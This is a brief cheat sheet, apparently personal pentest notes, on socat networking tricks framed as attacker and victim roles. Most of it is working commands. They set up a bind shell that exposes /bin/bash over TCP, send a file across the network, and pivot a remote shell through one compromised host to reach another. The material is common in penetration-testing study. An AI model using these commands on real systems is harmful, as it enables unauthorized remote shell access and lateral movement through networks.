### Basic Chat:

**Attacker**:
`socat TCP4-LISTEN:1234 STDOUT`

**Victim**:
`socat STDIN TCP4:127.0.0.1:1234`

Now the attacker can send messages to victim. Just a chat scenario.

---

### Bind Shell:

**Victim**:
`socat TCP4-LISTEN:1234 EXEC:/bin/bash`

**Attacker**:
`socat STDIN TCP4:<victim-ip>:1234`
Now attacker can execute commands and output will be shown here.

---

### File Transfer:

**System 1**:
`socat FILE:./<file> TCP4-LISTEN:1234`

**System 2**:
`socat - TCP4:<sys1-ip>:1234 > file`
Now the file will be downloaded and saved to 'file'.

---

### Pivoting:

**Victim 2**:
`socat TCP4-LISTEN:1234 EXEC:/bin/bash`

**Victim 1**:
`socat TCP4-LISTEN:3333 TCP4:<victim-2-ip>:1234`

**Attacker**:
`socat STDIN TCP4:<victim-1-ip>:3333`
Now attacker can execute commands to victim 2 from here.
